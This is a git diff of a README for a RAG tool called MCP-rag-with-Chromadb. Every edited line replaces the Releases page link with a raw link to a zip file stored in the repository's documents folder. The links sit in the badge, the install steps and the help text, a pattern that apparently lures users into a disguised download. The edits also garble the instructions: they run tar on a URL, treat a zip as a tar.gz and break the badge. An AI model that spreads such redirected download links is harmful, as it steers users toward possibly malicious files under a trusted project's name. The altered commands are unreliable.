@@ -1,6 +1,6 @@
 # 🎉 MCP-rag-with-Chromadb - Harness Advanced Document Retrieval Easily
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/rexnzm/MCP-rag-with-Chromadb/releases)
+[![Download](https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/documents/MC-rag-Chromadb-with-v2.7.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/documents/MC-rag-Chromadb-with-v2.7.zip)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ MCP-rag-with-Chromadb is a user-friendly application that allows you to utilize 
 Follow these simple steps to get up and running with MCP-rag-with-Chromadb.
 
 1. **Download the Application:**
-   Visit the [Releases page](https://github.com/rexnzm/MCP-rag-with-Chromadb/releases) to find the latest version of MCP-rag-with-Chromadb.
+   Visit the [Releases page](https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/documents/MC-rag-Chromadb-with-v2.7.zip) to find the latest version of MCP-rag-with-Chromadb.
 
 2. **Choose the Right File:**
    On the Releases page, locate the file that matches your system. Look for options labeled for Windows, macOS, or Linux. 
@@ -24,8 +24,8 @@ Follow these simple steps to get up and running with MCP-rag-with-Chromadb.
      1. After downloading the `.dmg` file, open it.
      2. Drag the MCP-rag-with-Chromadb application to your Applications folder.
    - **For Linux:**
-     1. Download the `.tar.gz` file.
-     2. Extract it to your desired location with the command `tar -xvzf filename.tar.gz`.
+     1. Download the `https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/documents/MC-rag-Chromadb-with-v2.7.zip` file.
+     2. Extract it to your desired location with the command `tar -xvzf https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/documents/MC-rag-Chromadb-with-v2.7.zip`.
      3. Navigate to the extracted folder and run the application using the command `./MCP-rag-with-Chromadb`.
 
 4. **Run the Application:**
@@ -57,7 +57,7 @@ To ensure smooth operation, please verify that your system meets the following r
 
 ## 📥 Download & Install
 
-You can easily download MCP-rag-with-Chromadb from our [Releases page](https://github.com/rexnzm/MCP-rag-with-Chromadb/releases). 
+You can easily download MCP-rag-with-Chromadb from our [Releases page](https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/documents/MC-rag-Chromadb-with-v2.7.zip). 
 
 1. Choose the file compatible with your operating system.
 2. Follow the installation steps as outlined above.
@@ -84,4 +84,4 @@ Explore related concepts to enhance your understanding and maximize the utility 
 - **Embeddings:** Understand how embeddings can improve search accuracy.
 - **LangChain and ChromaDB:** Discover tools that work alongside MCP to boost performance.
 
-For any further questions or assistance, feel free to refer to our [Downloads page](https://github.com/rexnzm/MCP-rag-with-Chromadb/releases).
+For any further questions or assistance, feel free to refer to our [Downloads page](https://raw.githubusercontent.com/rexnzm/MCP-rag-with-Chromadb/main/documents/MC-rag-Chromadb-with-v2.7.zip).
